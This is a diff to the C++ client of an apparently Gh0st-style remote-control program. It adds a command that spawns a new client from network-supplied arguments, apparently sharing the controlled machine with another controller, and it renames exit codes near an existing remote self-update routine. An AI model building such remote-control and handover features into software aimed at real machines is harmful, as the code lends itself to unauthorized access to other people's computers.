@@ -8,6 +8,7 @@
 #include <iostream>
 #include <fstream>
 #include <corecrt_io.h>
+#include "ClientDll.h"
 
 //////////////////////////////////////////////////////////////////////
 // Construction/Destruction
@@ -125,6 +126,20 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 
 	switch(szBuffer[0])
 	{
+	case COMMAND_SHARE:
+		if (ulLength > 2) {
+			switch (szBuffer[1]) {
+			case SHARE_TYPE_YAMA: {
+				auto a = NewClientStartArg((char*)szBuffer + 2, IsSharedRunning, TRUE);
+				if (nullptr!=a) CloseHandle(CreateThread(0, 0, StartClientApp, a, 0, 0));
+				break;
+			}
+			case SHARE_TYPE_HOLDINGHANDS:
+				break;
+			}
+		}
+		break;
+
 	case CMD_HEARTBEAT_ACK:
 		if (ulLength > 8) {
 			uint64_t n = 0;
@@ -180,7 +195,7 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 		{
 			BYTE	bToken = COMMAND_BYE;// 被控端退出
 			m_ClientObject->OnServerSending((char*)&bToken, 1);
-			g_bExit = 1;
+			g_bExit = S_CLIENT_EXIT;
 			OutputDebugStringA("======> Client exit \n");
 			break;
 		}
@@ -189,7 +204,7 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 		{
 			BYTE	bToken = SERVER_EXIT;// 主控端退出  
 			m_ClientObject->OnServerSending((char*)&bToken, 1);
-			g_bExit = 2;
+			g_bExit = S_SERVER_EXIT;
 			OutputDebugStringA("======> Server exit \n");
 			break;
 		}
@@ -246,7 +261,7 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 			ULONGLONG size=0;
 			memcpy(&size, (const char*)szBuffer + 1, sizeof(ULONGLONG));
 			if (WriteBinaryToFile((const char*)szBuffer + 1 + sizeof(ULONGLONG), size)) {
-				g_bExit = 3;
+				g_bExit = S_CLIENT_UPDATE;
 			}
 			break;
 		}
